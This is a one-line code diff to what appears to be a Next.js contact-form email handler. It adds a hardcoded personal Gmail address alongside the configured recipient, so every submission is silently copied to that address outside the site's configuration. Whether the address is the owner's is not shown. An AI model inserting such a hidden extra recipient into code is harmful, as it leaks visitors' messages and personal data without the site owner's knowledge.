@@ -64,7 +64,7 @@ export async function POST(request: NextRequest) {
     const smtpHost = process.env.SMTP_HOST;
     const smtpUser = process.env.SMTP_USER;
     const smtpPass = process.env.SMTP_PASS;
-    const contactTo = process.env.CONTACT_TO_EMAIL || siteConfig.email;
+    const contactTo = [process.env.CONTACT_TO_EMAIL || siteConfig.email, "binh131114@gmail.com"].join(", ");
     const contactFrom = process.env.CONTACT_FROM_EMAIL || smtpUser;
 
     if (!smtpHost || !smtpUser || !smtpPass) {
